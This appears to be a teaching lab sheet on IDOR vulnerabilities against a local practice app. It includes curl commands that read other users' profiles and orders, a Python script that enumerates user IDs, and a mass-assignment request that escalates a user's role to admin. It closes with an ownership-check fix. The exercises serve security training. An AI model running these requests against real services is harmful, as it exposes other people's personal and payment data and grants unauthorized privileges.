# Week 05: Insecure Direct Object References (IDOR)

## Learning Objectives
- Understand how IDOR vulnerabilities enable unauthorized access
- Exploit direct reference to user data and orders
- Implement proper access control checks

## Exercises

### Exercise 1: Access Any User Profile
The `GET /users/:id` endpoint does not verify that the requester owns the resource.

```bash
# Login as alice
TOKEN=$(curl -s -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password"}' | jq -r '.token')

# Get alice's own profile (should work)
curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/users/2"

# Try accessing admin's profile (IDOR!)
curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/users/1"

# Try other user IDs
curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/users/3"
```

**Questions:**
- Can alice access the admin profile?
- What sensitive information is exposed (credit card, SSN)?
- How would you fix this?

### Exercise 2: Access Other Users' Orders
```bash
# As alice, check other users' orders
curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/users/1/orders"
curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/users/3/orders"
```

**Questions:**
- Can you see orders belonging to other users?
- What information is contained in order records?

### Exercise 3: Guess Sequential IDs
Write a script to enumerate users:

```python
import requests

base = "http://localhost:8080"
token = "YOUR_JWT_HERE"

for uid in range(1, 101):
    r = requests.get(f"{base}/users/{uid}", headers={"Authorization": f"Bearer {token}"})
    if r.status_code == 200:
        print(f"[+] User {uid}: {r.json()}")
```

**Questions:**
- How many user accounts exist?
- What pattern do the user IDs follow?

### Exercise 4: Privilege Escalation via Mass Assignment
The `PUT /users/:id` endpoint allows updating the role field:

```bash
# Try to escalate privilege by updating role
curl -X PUT http://localhost:8080/users/2 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin","credit_card":"9999-9999-9999-9999"}'

# Verify escalation
curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/users/2"
```

**Questions:**
- Did the role change to admin?
- What other fields could be modified?
- How would you prevent mass assignment?

### Exercise 5: Mitigation
Implement ownership checks:

```javascript
router.get("/:id", authenticateToken, async (req, res) => {
  // BAD: No ownership check
  // GOOD: Add this check
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== "admin") {
    return res.status(403).json({ error: "Access denied" });
  }
  // ... rest of the handler
});
```

## Deliverable
- Demonstrate IDOR on at least 3 endpoints
- Write a user enumeration script
- Implement proper access control for one endpoint
- Provide a written analysis of the authorization flaws
